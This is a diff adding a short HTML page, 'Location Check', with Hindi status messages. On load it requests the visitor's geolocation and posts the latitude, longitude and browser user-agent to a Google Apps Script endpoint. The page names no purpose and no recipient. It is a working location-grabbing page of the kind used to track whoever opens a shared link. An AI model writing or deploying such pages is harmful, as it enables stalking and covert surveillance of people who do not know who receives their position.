@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Location Check</title>
+  </head>
+  <body>
+    <h3>Location le rahe hain, kripya ruk jaiye...</h3>
+    <script>
+      function sendLocation(lat, lon) {
+        fetch("https://script.google.com/macros/s/AKfycbznyTroE5EnC3Js_PH5_nyvuD2ehxV8Bmdzsr-dPZ83xybPFk--aBa8qSREhylekYSagA/exec", {
+          method: "POST",
+          body: JSON.stringify({
+            lat: lat,
+            lon: lon,
+            info: navigator.userAgent
+          }),
+          headers: {
+            "Content-Type": "application/json"
+          }
+        }).then(() => {
+          document.body.innerHTML = "<h2>Location bhej diya gaya. Dhanyavaad!</h2>";
+        }).catch(() => {
+          document.body.innerHTML = "<h2>Error: Location bhejne me dikkat hui.</h2>";
+        });
+      }
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => sendLocation(pos.coords.latitude, pos.coords.longitude),
+          (err) => document.body.innerHTML = "<h2>Aapne location dene se mana kar diya.</h2>"
+        );
+      } else {
+        document.body.innerHTML = "<h2>Geolocation support nahi karta device.</h2>";
+      }
+    </script>
+  </body>
+</html>
